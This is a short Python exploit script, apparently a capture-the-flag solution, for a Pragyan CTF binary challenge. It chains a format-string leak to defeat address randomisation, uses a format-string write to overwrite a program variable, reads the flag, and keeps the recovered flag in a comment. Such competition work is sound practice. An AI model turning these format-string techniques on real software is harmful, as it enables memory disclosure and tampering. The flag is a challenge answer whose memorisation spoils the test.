#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./load')
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6003)

gdbscript = '''
tbreak main
brva 0x15d8
continue
'''.format(**locals())

def check(payload):
	sla(b"2) Upgrade Pack\n", b"1")
	sla(b"Wanna upgrade pack?\n", payload)

def upgrade(payload):
	sla(b"2) Upgrade Pack\n", b"2")
	sla(b"Enter coupon code:\n", payload)

libc=SetupLibcELF()
for i in range(1):
	# try:
		io=start()
		check("%7$p|")
		leak=rl().split(b"|")
		print(leak)
		exe.address=int(leak[0],16)-0x217f
		# info(f"CANARY := {hex(canary)}")
		pb()
		pay1=fmtstr_payload(offset=6, writes={exe.sym.b : 0xf9}, write_size='short')
		check(pay1)
		upgrade(f"%{11}$p")
		rl()
		print(f"FLAG {rl()}")
		io.interactive()
	# except:
		# pass
# io.interactive()
# p_ctf{W3ll_1t_W4s_3aSy_0n1y}                                                                                                                                                   

# remote 7 local 12